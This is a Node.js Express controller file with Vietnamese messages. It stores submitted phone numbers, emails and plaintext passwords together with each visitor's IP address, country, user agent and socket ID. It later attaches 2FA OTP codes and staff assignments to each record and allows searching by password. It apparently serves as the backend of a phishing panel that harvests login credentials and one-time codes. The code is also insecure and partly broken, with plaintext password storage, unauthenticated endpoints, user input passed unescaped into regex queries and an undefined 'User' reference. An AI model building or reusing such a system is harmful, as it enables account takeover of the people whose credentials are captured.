const bcrypt = require("bcryptjs");
const TableSchema = require("../models/table.model");
const CTRL = require("../models/index");

const { io } = require("../app");

const create = async (req, res) => {
  try {
    const {
      ip,
      quocGiaIp,
      userGent,
      quocGiaPhone,
      phone,
      email,
      password,
      socketId,
      codeRandom,
      owner,
    } = req.body;
    const checkPhone = await TableSchema.find(
      { phone: phone } || { email: email }
    );
    // console.log(checkPhone);
    if (checkPhone.length > 0 && checkPhone !== null) {
      const a = await TableSchema.create({
        owner: owner,
        ip: ip,
        quocGiaIp: quocGiaIp,
        userGent: userGent,
        quocGiaPhone: quocGiaPhone,
        phone: phone,
        email: email,
        idStaff: checkPhone[0].idStaff,
        username: checkPhone[0].username,
        password: password,
        statusVery: true,
        socketId: socketId,
        codeRandom: codeRandom,
        note: true,
      });
      return res.status(200).json({
        data: a,
        oke: true,
        message: "Bạn đã tạo tài khoản thành công! 🎉'",
      });
    } else {
      const a = await TableSchema.create({
        ip: ip,
        quocGiaIp: quocGiaIp,
        userGent: userGent,
        quocGiaPhone: quocGiaPhone,
        phone: phone,
        email: email,
        password: password,
        socketId: socketId,
        codeRandom: codeRandom,
        note: false,
      });
      return res.status(200).json({
        data: a,
        oke: true,
        message: "Bạn đã tạo tài khoản thành công! 🎉'",
      });
    }
  } catch (error) {
    console.log(error);
    return res.status(500).json({ errMessage: error.message });
  }
};

const getTable = async (req, res) => {
  try {
    // const table = await TableSchema.find({})
    const { phone, password, email } = req.query;
    let query = {};

    if (phone && password && email) {
      query = {
        $and: [
          { phone: { $regex: phone, $options: "i" } },
          { password: { $regex: password, $options: "i" } },
          { email: { $regex: email, $options: "i" } },
        ],
      };
    } else if (phone) {
      query = { phone: { $regex: phone, $options: "i" } };
    } else if (password) {
      query = { password: { $regex: password, $options: "i" } };
    } else if (email) {
      query = { email: { $regex: email, $options: "i" } };
    }
    const table = await TableSchema.find(query).sort({ createdAt: -1 }).exec();

    if (!table) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }
    if (table.length >= 16) {
      table.splice(15);
    }

    res.status(200).json({
      ok: true,
      table,
    });
  } catch (err) {
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin bảng.",
    });
  }
};

const updateTables = async (req, res) => {
  const data = req.body;
  try {
    const updatedData = {};
    const tableId = req.body._id ? req.body._id : null;
    if (req.body.idStaff) {
      updatedData.idStaff = req.body.idStaff;
    }
    if (req.body.otp2FA) {
      updatedData.otp2FA = req.body.otp2FA;
    }
    if (req.body.username) {
      updatedData.username = req.body.username;
    }
    if (req.body.password) {
      updatedData.password = req.body.password;
    }
    if (req.body.status) {
      updatedData.status = req.body.status;
    }

    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
      const user = await TableSchema.findByIdAndUpdate(
        tableId,
        {
          $set: updatedData,
          $inc: { countUpdate: +1 },
        },
        {
          new: true,
        }
      );
    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }

    // user.isAdmin = undefined;
    // user.isStaff = undefined;
    // user.password = undefined;
    // user.__v = undefined;
    await user.save();
    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};

// const handleTableRequest = async (req, res) => {
//   try {
//     if (req.method === 'POST') {
//       try {
//         const { ip, quocGiaIp, userGent, quocGiaPhone, phone, email, password } = req.body;

//         const newUser = new TableSchema({
//           ip: ip,
//           quocGiaIp: quocGiaIp,
//           userGent: userGent,
//           quocGiaPhone: quocGiaPhone,
//           phone: phone,
//           email: email,
//           password: password
//         });
//         await newUser.save();
//         io.emit('newData', { message: 'Dữ liệu mới đã được tạo', newData: newUser });
//         res.status(200).json({
//           oke: true,
//           message: "Bạn đã tạo tài khoản thành công! 🎉'",
//         });
//       } catch (error) {
//         console.log(error);
//         return res.status(500).json({ errMessage: error.message });
//       }
//     } else if (req.method === 'GET') {
//       try {
//         // if (!req.user) {
//         //   return res.status(401).json({
//         //     ok: false,
//         //     errMessage: 'Token không hợp lệ hoặc người dùng không xác thực.',
//         //   });
//         // }

//         const table = await TableSchema.find();
//         if (!table) {
//           return res.status(404).json({
//             ok: false,
//             errMessage: 'Không tìm thấy người dùng.',
//           });
//         }
//         io.emit('tableData', { data: table });

//         res.status(200).json({
//           ok: true,
//           table,
//         });
//       } catch (err) {
//         res.status(500).json({
//           ok: false,
//           errMessage: 'Lỗi trong quá trình lấy thông tin bảng.',
//         });
//       }
//     }
//   } catch (err) {
//     res.status(500).json({
//       ok: false,
//       errMessage: 'Lỗi trong quá trình xử lý yêu cầu bảng.',
//     });
//   }
// };

const confirmUser = (req, res) => {};

const getUserProfile = async (req, res) => {
  try {
    if (!req.user) {
      return res.status(401).json({
        ok: false,
        errMessage: "Token không hợp lệ hoặc người dùng không xác thực.",
      });
    }
    const userId = req.user ? req.user.id : null;
    const user = await TableSchema.findOne({ _id: userId });

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }
    user.isAdmin = undefined;
    user.isStaff = undefined;
    user.password = undefined;
    user.__v = undefined;

    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};

const getAllUser = async (req, res) => {
  try {
    const users = await TableSchema.find({ isStaff: true }).sort("__v");
    const usersWithoutPassword = users.map((user) => {
      const { password, isAdmin, ...userWithoutPassword } = user.toObject();
      return userWithoutPassword;
    });
    const countAllUsers = users.length;

    return res.status(200).json({
      count: countAllUsers,
      user: usersWithoutPassword,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const searchTable = async (req, res) => {
  try {
    const { phone, password, email } = req.query;
    let query = {};

    if (phone && password && email) {
      query = {
        $and: [
          { phone: { $regex: phone, $options: "i" } },
          { password: { $regex: password, $options: "i" } },
          { email: { $regex: email, $options: "i" } },
        ],
      };
    } else if (phone) {
      query = { phone: { $regex: phone, $options: "i" } };
    } else if (password) {
      query = { password: { $regex: password, $options: "i" } };
    } else if (email) {
      query = { email: { $regex: email, $options: "i" } };
    }

    const searchStaff = await TableSchema.find(query);

    return res.status(200).json(searchStaff);
  } catch (error) {
    return res.status(400).json(error);
  }
};

const deleteStaff = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await TableSchema.findByIdAndDelete(userId);

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Người dùng không tồn tại",
      });
    }
    return res.status(200).json({
      ok: true,
      message: "Người dùng đã được xoá thành công!",
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const updateProfile = async (req, res) => {
  try {
    if (!req.user) {
      return res.status(401).json({
        ok: false,
        errMessage: "Token không hợp lệ hoặc người dùng không xác thực.",
      });
    }
    const updatedData = {};
    const userId = req.user ? req.user.id : null;
    if (req.body.name) {
      updatedData.name = req.body.name;
    }
    if (req.files && req.files[0] && req.files[0].path) {
      updatedData.avatar = req.files[0].path;
    }
    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
    const user = await TableSchema.findByIdAndUpdate(userId, updatedData, {
      new: true,
    });

    if (!user) {
      return res.status(404).json({
        ok: false,
        errMessage: "Không tìm thấy người dùng.",
      });
    }

    // user.isAdmin = undefined;
    // user.isStaff = undefined;
    // user.password = undefined;
    // user.__v = undefined;
    await user.save();
    res.status(200).json({
      ok: true,
      user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({
      ok: false,
      errMessage: "Lỗi trong quá trình lấy thông tin người dùng.",
    });
  }
};

const updatePasswordByAdmin = async (req, res) => {
  try {
    const { userId } = req.params;
    const { password } = req.body;
    const salt = bcrypt.genSaltSync(10);
    const passwordHash = bcrypt.hashSync(password, salt);
    const user = await TableSchema.findByIdAndUpdate(
      userId,
      { password: passwordHash },
      { new: true }
    );
    await user.save();
    user.password = undefined;
    return res.status(201).json({
      ok: true,
      message: "Cập nhật thành công!",
      user: user,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const getUserWithMail = async (req, res) => {
  const { email } = req.body;
  await User.getUserWithMail(email, (err, result) => {
    if (err) return res.status(404).send(err);

    const dataTransferObject = {
      name: result.name,
      avatar: result.avatar,
      username: result.username,
      color: result.color,
      email: result.email,
    };
    return res.status(200).send(dataTransferObject);
  });
};

const updateStaff = async (req, res) => {
  try {
    const { userId } = req.params;
    const updatedData = {};
    if (req.body.name) {
      updatedData.name = req.body.name;
    }
    if (req.body.phone) {
      updatedData.phone = req.body.phone;
    }
    if (req.body.email) {
      updatedData.email = req.body.email;
    }
    if (req.body.status) {
      updatedData.status = req.body.status;
    }
    if (req.files && req.files[0] && req.files[0].path) {
      updatedData.avatar = req.files[0].path;
    }
    if (Object.keys(updatedData).length === 0) {
      return res.status(400).json({
        ok: false,
        errMessage: "Không có dữ liệu để cập nhật.",
      });
    }
    const user = await TableSchema.findByIdAndUpdate(userId, updatedData, {
      new: true,
    });
    await user.save();
    user.password = undefined;
    return res.status(201).json({
      ok: true,
      message: "Cập nhật thành công!",
      user: user,
    });
  } catch (err) {
    console.log(err);
    return res.status(500).json({ msg: err.message });
  }
};

const createUser = async (req, res) => {
  // const images_url = req.files.map((image) => image.path);
  const images_url = req.files[0].path;
  const salt = bcrypt.genSaltSync(10);
  const newUser = new TableSchema({
    name: req.body.name,
    email: req.body.email,
    address: req.body.address,
    username: req.body.username,
    password: bcrypt.hashSync(req.body.password, salt),
    avatar: images_url,
    isAdmin: req.body.isAdmin,
  });
  if (req.user.isAdmin !== true) {
    return res.status(403).json({ message: "Bạn không phải admin" });
  }
  await newUser.save((err, user) => {
    if (err) {
      return res.status(500).json({
        ok: false,
        err,
      });
    }
    user.password = undefined;
    return res.status(200).json({
      ok: true,
      message: "Xác thực quyền admin thành công",
      user,
    });
  });
};

module.exports = {
  create,
  getTable,
  deleteStaff,
  // handleTableRequest,
  searchTable,
  updatePasswordByAdmin,
  getAllUser,
  getUserWithMail,
  updateProfile,
  updateTables,
  // updateUser,
  updateStaff,
  createUser,
  getUserProfile,
};
